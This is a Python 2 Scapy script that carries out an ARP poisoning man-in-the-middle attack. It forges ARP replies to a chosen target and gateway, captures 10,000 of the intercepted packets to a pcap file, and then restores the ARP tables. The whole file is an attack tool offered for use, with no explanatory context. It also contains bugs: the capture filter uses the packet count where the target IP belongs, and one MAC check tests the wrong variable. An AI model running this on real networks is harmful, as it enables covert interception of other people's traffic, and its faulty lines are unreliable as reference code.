from scapy.all import *
import os
import sys
import threading
import signal

iface  = "wlp8s0"


pac_count = 10000

conf.iface  = iface
conf.verb = 0

def restore_target(g_ip,g_mac,t_ip,t_mac):
    #different method using send 
    print "[*] Restoring target......"
    send(ARP(op=2,psrc=g_ip,pdst=t_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=g_mac),count=5)
    send(ARP(op=2,psrc=t_ip,pdst=g_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=t_mac),count=5)
    
    #exit the main thread

    os.kill(os.getpid(),signal.SIGINT)

def get_mac(ip):
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,retry=10)

    for r,s in ans:
        return r[Ether].src
    return None

def poison_target(g_ip,g_mac,t_ip,t_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = g_ip
    poison_target.pdst = t_ip
    poison_target.hwdst = t_mac


    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = t_ip
    poison_gateway.pdst = g_ip
    poison_gateway.hwdst = g_mac

    print "[*] beginning the ARP poison [Ctrl + C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(g_ip,g_mac,t_ip,t_mac)
    print "[*] ARP poison attack finished." 
    return


t_ip=raw_input("[=>>]Enter the target IP:")
g_ip=raw_input("[=>>]Enter the gateway IP:")
print "[*] Setting up %s "%iface

g_mac = get_mac(g_ip)

if g_mac is None:
    print "[!!]Failed to get gateway MAC.Exiting."
    sys.exit(0)

else:
    print "[*]Gateway %s is at %s"%(g_ip,g_mac)

t_mac = get_mac(t_ip)

if t_ip is None:
    print "[!!]Failed to get target MAC.Exiting."
    sys.exit(0)
else:
    print "[*]Target %s is at %s"%(t_ip,t_mac)

poison_thread = threading.Thread(target = poison_target, args=(g_ip,g_mac,t_ip,t_mac))
poison_thread.start()

try:
    print "[*]starting sniffer for %d packets" %pac_count

    bpf_filter = "ip host %s"%pac_count

    pkts = sniff(count=pac_count,filter=bpf_filter,iface=iface)

    #write out captured packets
    wrpcap('arper.pcap',pkts)

    #restore the network
    restore_target(g_ip,g_mac,t_ip,t_mac)

except KeyboardInterrupt:
    
    #restore the network
    restore_target(g_ip,g_mac,t_ip,t_mac)
    sys.exit(0)
